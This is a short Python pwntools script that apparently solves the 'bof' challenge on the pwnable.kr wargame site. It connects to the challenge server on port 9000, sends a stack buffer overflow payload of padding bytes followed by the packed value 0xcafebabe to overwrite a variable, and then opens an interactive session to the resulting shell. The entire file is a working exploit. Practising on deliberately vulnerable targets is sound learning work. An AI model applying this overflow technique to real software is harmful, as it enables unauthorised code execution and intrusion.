from pwn import *

#p = ssh('bof', 'pwnable.kr', 2222, 'guest')

#path = './bof'
#payload = [path]
#s = p.process('./bof')
s = remote('pwnable.kr', 9000)
payload = b'A' * 0x2c + b'B' * 8 + p32(0xcafebabe)
s.sendlineafter(b" : ", payload)
s.interactive()
